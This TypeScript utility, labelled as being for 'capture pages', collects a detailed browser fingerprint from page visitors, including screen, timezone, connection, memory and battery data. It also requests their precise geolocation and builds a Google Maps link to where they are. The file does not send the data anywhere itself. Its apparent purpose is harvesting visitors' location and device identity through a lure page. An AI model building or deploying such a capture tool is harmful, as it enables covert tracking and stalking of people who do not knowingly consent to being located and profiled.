// Device info collection utility for capture pages
export interface DeviceInfo {
  // Browser & System
  userAgent: string;
  platform: string;
  language: string;
  languages: string;
  cookieEnabled: boolean;
  doNotTrack: string | null;
  hardwareConcurrency: number;
  maxTouchPoints: number;
  vendor: string;
  appVersion: string;
  
  // Screen
  screenWidth: number;
  screenHeight: number;
  screenColorDepth: number;
  screenPixelDepth: number;
  windowInnerWidth: number;
  windowInnerHeight: number;
  devicePixelRatio: number;
  
  // Time
  timezone: string;
  timezoneOffset: number;
  localTime: string;
  
  // Connection
  connectionType: string;
  downlink: string;
  onLine: boolean;
  
  // Device
  deviceMemory: string;
  webdriver: boolean;
  
  // Battery
  batteryLevel?: string;
  batteryCharging?: boolean;
  
  // Location
  latitude: number | null;
  longitude: number | null;
  accuracy: string | null;
  altitude: number | null;
  altitudeAccuracy: number | null;
  heading: number | null;
  speed: number | null;
  locationTimestamp: string | null;
  googleMapsLink: string | null;
  locationError: string | null;
}

export const collectDeviceInfo = (): Promise<DeviceInfo> => {
  return new Promise((resolve) => {
    const info: DeviceInfo = {
      // Browser & System
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      languages: navigator.languages?.join(", ") || "",
      cookieEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      hardwareConcurrency: navigator.hardwareConcurrency,
      maxTouchPoints: navigator.maxTouchPoints,
      vendor: navigator.vendor,
      appVersion: navigator.appVersion,
      
      // Screen
      screenWidth: window.screen.width,
      screenHeight: window.screen.height,
      screenColorDepth: window.screen.colorDepth,
      screenPixelDepth: window.screen.pixelDepth,
      windowInnerWidth: window.innerWidth,
      windowInnerHeight: window.innerHeight,
      devicePixelRatio: window.devicePixelRatio,
      
      // Time
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      localTime: new Date().toLocaleString(),
      
      // Connection
      connectionType: (navigator as any).connection?.effectiveType || "unknown",
      downlink: (navigator as any).connection?.downlink?.toString() || "unknown",
      onLine: navigator.onLine,
      
      // Device
      deviceMemory: (navigator as any).deviceMemory?.toString() || "unknown",
      webdriver: navigator.webdriver || false,
      
      // Location - will be updated
      latitude: null,
      longitude: null,
      accuracy: null,
      altitude: null,
      altitudeAccuracy: null,
      heading: null,
      speed: null,
      locationTimestamp: null,
      googleMapsLink: null,
      locationError: null,
    };

    let resolved = false;
    const resolveWithInfo = () => {
      if (!resolved) {
        resolved = true;
        resolve(info);
      }
    };

    // Get Battery
    if ("getBattery" in navigator) {
      (navigator as any).getBattery().then((battery: any) => {
        info.batteryLevel = Math.round(battery.level * 100) + "%";
        info.batteryCharging = battery.charging;
      }).catch(() => {});
    }

    // Get Location
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          info.latitude = pos.coords.latitude;
          info.longitude = pos.coords.longitude;
          info.accuracy = pos.coords.accuracy + " meters";
          info.altitude = pos.coords.altitude;
          info.altitudeAccuracy = pos.coords.altitudeAccuracy;
          info.heading = pos.coords.heading;
          info.speed = pos.coords.speed;
          info.locationTimestamp = new Date(pos.timestamp).toISOString();
          info.googleMapsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
          resolveWithInfo();
        },
        (err) => {
          info.locationError = err.message;
          resolveWithInfo();
        },
        { 
          timeout: 10000, 
          enableHighAccuracy: true,
          maximumAge: 0
        }
      );
    } else {
      info.locationError = "Geolocation not supported";
      resolveWithInfo();
    }

    // Timeout fallback
    setTimeout(() => {
      resolveWithInfo();
    }, 12000);
  });
};